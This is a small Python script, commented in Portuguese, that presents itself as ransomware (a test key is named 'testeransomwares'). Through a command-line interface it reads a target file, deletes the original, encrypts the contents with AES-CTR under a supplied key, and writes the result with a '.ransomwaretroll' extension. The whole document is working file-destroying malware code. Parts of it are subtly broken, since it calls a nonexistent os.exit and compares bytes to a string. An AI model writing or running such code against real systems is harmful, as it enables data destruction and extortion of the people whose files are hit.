import os
import pyaes
import click

## abrir o arquivo a ser criptografado
# file_name = "teste.txt"
def file_opener(file_data):
    with open(file_data, "rb") as f:
        data = f.read()
        ## remover o arquivo
        os.remove(file_data)
        return data


def file_crypter(file_data, key):
    ## palavra-chave para teste "testeransomwares"
    ## chave para descriptografia
    if len(key) < 16:
    	os.exit(-2)
    	
    if file_data == "":
    	os.exit(-1)
    	
    aes = pyaes.AESModeOfOperationCTR(bytes(key, "utf-8"))
    ## criptografar o arquivo
    crypto_data = aes.encrypt(file_data)
    return crypto_data


def file_writer(file_name, crypto_data):
    ## salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    with open(f"{new_file}",'wb') as f:
        f.write(crypto_data)

@click.command()
@click.option("--file", "-f", prompt="File to Encrypt", help="Path of File to Encrypt")
@click.option("--key", "-k", prompt="Key to Encrypt File", help="Necessary key to encrypt the target file")
def main(file, key):
    file_data = file_opener(file)
    crypto_data = file_crypter(file_data, key)
    file_writer(file, crypto_data)

if __name__ == '__main__':
    main()
